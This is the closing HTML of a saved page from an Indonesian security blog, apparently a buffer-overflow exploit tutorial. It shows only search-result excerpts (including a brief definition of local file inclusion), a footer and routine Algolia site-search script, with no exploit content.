kerentanan/vulnerability yang umum ditemukan pada aplikasi web. 
Kerentanan ini memungkinkan penyerang/attacker untuk menyertakan file 
lokal yang tersimpan di server agar dapat menjadi bagian dari proses 
eksekusi aplikasi.</p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/about.html">About</a></h3>
      <div class="entry-excerpt"><p>Harry Adinanta</p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/kategori.html">Kategori Artikel</a></h3>
      <div class="entry-excerpt"><p>Berikut daftar artikel berdasarkan kategori.</p></div>
    </article>
  </div></div></div>
</div>

        </div>
      </div>
    </div>

    <footer id="footer" class="site-footer">
  <div class="inner">
    <div class="copyright">
      
        <p>© 2018 Harry Adinanta.</p>
      
    </div>
  </div>
</footer>

    

<script async="" src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/main.js"></script>

<!-- Including InstantSearch.js library and styling -->
<script src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/instantsearch.js"></script>
<link rel="stylesheet" type="text/css" href="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/instantsearch.css">
<link rel="stylesheet" type="text/css" href="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/instantsearch-theme-algolia.css">

<script>
// Instanciating InstantSearch.js with Algolia credentials
const search = instantsearch({
  appId: 'K6589TDSBP',
  apiKey: 'b62489ff825258c81dfb9f1d5aa0297f',
  indexName: 'harryadinanta',
  searchParameters: {
    restrictSearchableAttributes: [
      'title',
      'content'
    ]
  }
});

const hitTemplate = function(hit) {
  const url = hit.url;
  const title = hit._highlightResult.title.value;
  const content = hit._highlightResult.html.value;

  return `
    <article class="entry">
      <h3 class="entry-title"><a href="${url}">${title}</a></h3>
      <div class="entry-excerpt">${content}</div>
    </article>
  `;
}

// Adding searchbar and results widgets
search.addWidget(
  instantsearch.widgets.searchBox({
    container: '.search-searchbar',
    poweredBy: true,
    placeholder: 'Enter your search term...'
  })
);
search.addWidget(
  instantsearch.widgets.hits({
    container: '.search-hits',
    templates: {
      item: hitTemplate
    }
  })
);

// Starting the search
search.start();
</script>



  


<iframe style="display: none;"></iframe></body></html>